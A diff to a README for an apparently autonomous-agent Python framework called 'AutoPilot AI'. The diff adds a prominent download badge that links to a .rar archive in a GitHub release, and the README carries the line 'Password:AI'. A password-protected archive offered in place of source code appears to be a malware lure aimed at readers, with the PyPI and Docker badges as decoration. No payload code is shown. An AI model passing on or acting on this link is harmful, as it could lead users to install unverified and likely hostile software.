@@ -1,5 +1,9 @@
 <div align="center">
-# 🤖 AutoPilot AI
+
+  
+  # 🤖 AutoPilot AI
+
+
 **Password:AI**
 ### Open-Source Autonomous AI Agent Framework for Python
 
@@ -16,7 +20,18 @@ Build multi-agent systems that **think**, **plan**, and **execute** — with too
 **[Documentation](https://autopilot-ai.dev)** · **[Examples](examples/)** · **[Discord](https://discord.gg/autopilot-ai)** · **[Contributing](CONTRIBUTING.md)**
 
 
-[Download](https://github.com/pillarthrushtrimmer/AutoPilot-AI/releases/download/AutoPilot/autopilot-ai.rar)
+<div align="center">
+
+## 📥 Download & Install
+
+[![Download Latest](https://img.shields.io/badge/⬇_Download-v1.0.0-blue?style=for-the-badge&logo=github)](https://github.com/pillarthrushtrimmer/AutoPilot-AI/releases/download/AutoPilot/autopilot-ai.rar)
+[![PyPI Install](https://img.shields.io/badge/pip_install-autopilot--ai-orange?style=for-the-badge&logo=pypi&logoColor=white)](https://pypi.org/project/autopilot-ai/)
+[![Docker Pull](https://img.shields.io/badge/Docker-Pull_Image-2496ED?style=for-the-badge&logo=docker&logoColor=white)](https://hub.docker.com/r/jebo/autopilot-ai)
+
+</div>
+
+### ⚡ One-line install
+
 <img src="docs/assets/demo.gif" alt="AutoPilot AI Demo" width="700"/>
 
 </div>
